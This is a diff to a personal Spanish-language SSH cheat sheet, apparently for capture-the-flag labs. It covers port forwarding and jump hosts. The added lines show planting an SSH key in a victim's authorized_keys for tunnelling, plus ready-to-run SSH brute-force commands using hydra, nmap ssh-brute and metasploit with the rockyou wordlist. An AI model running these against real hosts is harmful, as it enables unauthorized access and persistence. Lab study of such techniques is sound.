@@ -4,7 +4,6 @@ sshpass -p 'PASSWORD' ssh -o StrictHostKeyChecking=no -p 1690 sistemas@10.21.17.
 # ssh jump
 ssh -J user@192.168.122.1 -o StrictHostKeyChecking=no quentin@192.168.0.20 -o StrictHostKeyChecking=no
 scp -o 'ProxyJump user@192.168.122.1' copy-paste-qemu.sh quentin@192.168.0.20:
-
 find thm/ -type f -iname 'notas'| xargs -i scp -o 'ProxyJump pgraffigna@192.168.122.1' '{}' quentin@192.168.0.20:
 
 # ssh dinamyc portforwarding
@@ -18,6 +17,10 @@ A> proxychains C:\Program Files\Mozilla Firefox\firefox.exe http://127.0.0.1:631
 # ssh local portforwarding (desde equipo local)
 ssh -L PUERTO_LOCAL:IP_REMOTA:PUERTO_REMOTO USUARIO@IP_REMOTA -fN
 ssh -L 8080:127.0.0.1:80 usuario@10.10.54.196 -i ssh_keys
+
+# cuando podes modificar authorized_keys en victima
+kali> ssh-keygen -f apaar
+kali> ssh -i apaar -L 9001:127.0.0.1:9001 apaar@10.10.151.118 -o StrictHostKeyChecking=no -fN
 
 # ssh remote portforwarding (desde equipo remoto)
 ssh -R 6631:127.0.0.1:631 USUARIO@IP_REMOTA -o StrictHostKeyChecking=no -fN
@@ -45,3 +48,7 @@ Host nagios
     LogLevel ERROR
     UserKnownHostsFile /dev/null
 
+# ssh brute force
+hydra -t 4 -l jake -P /usr/share/wordlists/rockyou.txt -vV 10.10.25.94 ssh
+nmap 10.10.50.172 -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=/usr/share/wordlists/rockyou.txt,brute.firstonly -v
+auxiliary/scanner/ssh/ssh_login --> metasploit
